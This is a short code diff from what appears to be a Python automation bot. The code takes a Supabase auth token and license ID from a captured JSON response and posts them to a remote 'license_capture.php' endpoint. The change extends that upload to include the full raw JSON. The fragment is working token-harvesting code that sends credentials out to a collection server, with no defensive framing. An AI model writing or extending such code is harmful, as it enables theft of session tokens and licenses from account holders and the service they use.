@@ -3580,7 +3580,7 @@ def _print_create_code(driver):
                             supa = j.get("supabaseToken") if isinstance(j, dict) else None
                             lic = j.get("licenseId") if isinstance(j, dict) else None
                             if supa and lic:
-                                _post_to_server("license_capture.php", {"bot_id": BOT_ID, "supabaseToken": supa, "licenseId": lic})
+                                _post_to_server("license_capture.php", {"bot_id": BOT_ID, "supabaseToken": supa, "licenseId": lic, "rawJson": pretty})
                                 log(f"stored supabase ...{supa[-8:]} lic {lic[:8]} like auth token", "ok")
                         except Exception as e:
                             log(f"store license_capture failed {e}", "warn")
